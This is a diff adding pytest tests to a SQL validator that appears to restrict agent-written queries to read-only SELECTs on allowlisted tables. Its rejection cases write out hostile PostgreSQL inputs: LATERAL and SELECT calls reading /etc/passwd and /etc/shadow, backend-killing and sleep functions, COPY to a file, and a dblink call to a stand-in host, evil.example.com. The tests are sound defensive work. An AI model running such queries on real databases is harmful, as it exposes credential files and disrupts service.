@@ -100,6 +100,101 @@ def test_validator_rejects_cte_with_mutation() -> None:
         validate_select_sql(sql)
 
 
+def test_validator_accepts_cte_with_allowlisted_table() -> None:
+    """CTE alias referenced in the outer SELECT must not trip the allowlist.
+
+    Without the CTE-alias exemption, agents writing legitimate WITH
+    blocks would hit a confusing 'alias outside allowlist' error.
+    """
+
+    sql = (
+        "WITH ok AS (SELECT id FROM nexo.dx_servicios) "
+        "SELECT * FROM ok WHERE id < 100"
+    )
+    validate_select_sql(sql)  # raises if rejected
+
+
+# --- LATERAL bypass (C1 from review) ---
+
+
+@pytest.mark.parametrize(
+    "sql",
+    [
+        "SELECT * FROM nexo.dx_servicios, LATERAL pg_read_file('/etc/passwd')",
+        "SELECT * FROM nexo.dx_servicios CROSS JOIN LATERAL pg_ls_dir('/')",
+        "SELECT * FROM nexo.dx_servicios "
+        "CROSS JOIN LATERAL pg_read_binary_file('/etc/shadow') AS x",
+    ],
+)
+def test_validator_rejects_lateral_function_in_from(sql: str) -> None:
+    """LATERAL <function> bypasses the table allowlist because the bypass
+    target is an `exp.Anonymous`, not an `exp.Table`. Reject LATERAL outright."""
+
+    with pytest.raises(UnsupportedConstruct):
+        validate_select_sql(sql)
+
+
+# --- Side-effect functions in SELECT (C2 from review) ---
+
+
+@pytest.mark.parametrize(
+    "sql",
+    [
+        "SELECT pg_terminate_backend(pid) FROM nexo.dx_servicios",
+        "SELECT pg_cancel_backend(pid) FROM nexo.dx_servicios",
+        "SELECT set_config('search_path', 'public', false) FROM nexo.dx_servicios LIMIT 1",
+        "SELECT pg_sleep(30) FROM nexo.dx_servicios",
+        "SELECT lo_import('/etc/passwd') FROM nexo.dx_servicios",
+        "SELECT pg_reload_conf() FROM nexo.dx_servicios LIMIT 1",
+        "SELECT pg_advisory_lock(1) FROM nexo.dx_servicios LIMIT 1",
+        "SELECT pg_read_file('/etc/passwd') FROM nexo.dx_servicios",
+        "SELECT dblink('host=evil.example.com', 'SELECT 1') FROM nexo.dx_servicios",
+    ],
+)
+def test_validator_rejects_side_effect_functions(sql: str) -> None:
+    """No-mutation isn't enough — side-effect functions DoS, exfiltrate
+    files, mutate session state, and kill backends, none of which produce
+    Insert/Update/Delete AST nodes. Positive function allowlist required."""
+
+    with pytest.raises(UnsupportedConstruct):
+        validate_select_sql(sql)
+
+
+@pytest.mark.parametrize(
+    "sql",
+    [
+        "SELECT count(*) FROM nexo.dx_servicios",
+        "SELECT lower(status), max(id) FROM nexo.dx_servicios GROUP BY lower(status)",
+        "SELECT coalesce(nombre, 'n/a'), to_char(now(), 'YYYY-MM-DD') FROM nexo.dx_servicios",
+        "SELECT date_trunc('day', refreshed_at) FROM nexo.dx_servicios",
+        "SELECT json_build_object('id', id, 'status', status) FROM nexo.dx_servicios",
+    ],
+)
+def test_validator_accepts_safe_builtin_functions(sql: str) -> None:
+    """Common aggregates / string / date / JSON builtins must pass."""
+
+    validate_select_sql(sql)
+
+
+# --- Merge / Copy mutations (defense in depth, M3 from review) ---
+
+
+@pytest.mark.parametrize(
+    "sql",
+    [
+        # MERGE (PG15+) — rejected as a non-SELECT top-level construct
+        # OR a Merge mutation node, depending on sqlglot version.
+        "MERGE INTO nexo.dx_servicios USING (SELECT 1 AS id) src ON true "
+        "WHEN MATCHED THEN UPDATE SET id = src.id",
+        # COPY — file I/O via SQL; also a non-SELECT top-level.
+        "COPY nexo.dx_servicios TO '/tmp/out.csv'",
+    ],
+)
+def test_validator_rejects_merge_and_copy(sql: str) -> None:
+    with pytest.raises((MutationRejected, UnsupportedConstruct)):
+        validate_select_sql(sql)
+
+
 # --------------------- Functional (mocked pool) ---------------------
 
 
